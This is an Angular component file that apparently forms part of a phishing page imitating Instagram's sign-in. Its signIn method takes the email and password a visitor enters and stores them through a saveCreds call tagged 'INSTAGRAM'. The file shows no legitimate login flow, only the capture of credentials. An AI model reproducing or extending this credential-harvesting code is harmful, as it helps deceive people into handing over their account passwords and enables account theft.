import { Component } from '@angular/core';
import { NgForm } from '@angular/forms';

import { SaveFacadeService } from 'src/app/services/save-facade.service';

@Component({
  selector: 'app-instagram',
  templateUrl: './instagram.component.html',
  styleUrls: ['./instagram.component.css']
})
export class InstagramComponent {


  

  constructor(private saveService: SaveFacadeService ){}

  signIn(form: NgForm){

    const email = form.value.email
    const pass = form.value.password
    
    this.saveService.saveCreds(email,pass,"INSTAGRAM")

  }
  

}
